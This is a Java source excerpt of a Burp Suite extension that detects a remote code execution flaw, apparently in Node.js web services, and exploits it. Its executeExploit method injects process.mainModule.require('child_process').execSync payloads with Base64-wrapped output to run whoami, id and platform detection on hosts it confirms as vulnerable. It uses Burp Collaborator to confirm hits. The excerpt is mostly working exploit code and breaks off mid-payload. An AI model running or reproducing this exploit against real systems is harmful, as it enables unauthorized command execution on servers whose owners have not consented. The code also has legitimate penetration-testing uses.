...
public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContextMenuFactory {
                        ...
                        for (IBurpCollaboratorInteraction interaction : interactions) {
                            ...
                            for (Map.Entry<String, PendingCheck> entry : pendingChecks.entrySet()) {
                                if (entry.getKey().contains(interactionId) || 
                                    ...
                                    try {
                                        String userResult = executeExploit(check.service, check.path, "whoami");
                                        if (userResult != null) info.userInfo = userResult.trim();
                                        else {
                                            userResult = executeExploit(check.service, check.path, "id");
                                            if (userResult != null) info.userInfo = userResult.trim();
                                        }
                                        
                                        String sysResult = executeExploit(check.service, check.path, "OS_DETECT");
                                        if (sysResult != null) {
                                            String os = sysResult.trim();
                                            if (os.equals("linux")) info.systemInfo = "Linux";
                                            else if (os.equals("win32")) info.systemInfo = "Windows";
                                            else if (os.equals("darwin")) info.systemInfo = "macOS";
                                            else info.systemInfo = os;
                                        }
                                    } catch (Exception e) {
                                        // Ignore
                                    }
    ...
    private VulnInfo checkVulnerability(IHttpService service, String baseUrl) {
        ...
        for (String path : paths) {
            ...
            if (result != null && result.contains(testString)) {
                ...
                // Use whoami as requested (better compatibility)
                String userResult = executeExploit(service, path, "whoami");
                if (userResult != null && !userResult.isEmpty()) {
                    info.userInfo = userResult.trim();
                } else {
                    // Fallback to id if whoami fails (e.g. not in path)
                    userResult = executeExploit(service, path, "id");
                    if (userResult != null && !userResult.isEmpty()) {
                        info.userInfo = userResult.trim();
                    }
                }
                
                // Use OS_DETECT (process.platform) instead of uname -a
                String sysResult = executeExploit(service, path, "OS_DETECT");
                if (sysResult != null && !sysResult.isEmpty()) {
                    String os = sysResult.trim();
                    if (os.equals("linux")) info.systemInfo = "Linux";
                    else if (os.equals("win32")) info.systemInfo = "Windows";
                    else if (os.equals("darwin")) info.systemInfo = "macOS";
                    else info.systemInfo = os; // Other OS
                }
     ...
     * Uses Node.js for Base64 encoding to support Windows and handle binary output
     * Wraps in try-catch to prevent crashing on command failure
     */
    private String executeExploit(IHttpService service, String path, String command) {
        try {
            // Special case for OS detection using Node.js property
            String jsCode;
            if (command.equals("OS_DETECT")) {
                jsCode = "process.platform";
            } else {
                // Escape backslashes and single quotes for JS string
                String escapedCommand = command.replace("\\", "\\\\").replace("'", "\\'");
                jsCode = String.format("process.mainModule.require('child_process').execSync('%s')", escapedCommand);
            }
            
            // Robust payload:
            // 1. Try to execute code
            // 2. Convert result to Base64 using Node.js Buffer (works on Windows/Linux)
            // 3. Catch any errors and return error message in Base64
            String prefix = String.format(
                "var res='';" +
                "try{" +
                    "var out=%s;" +
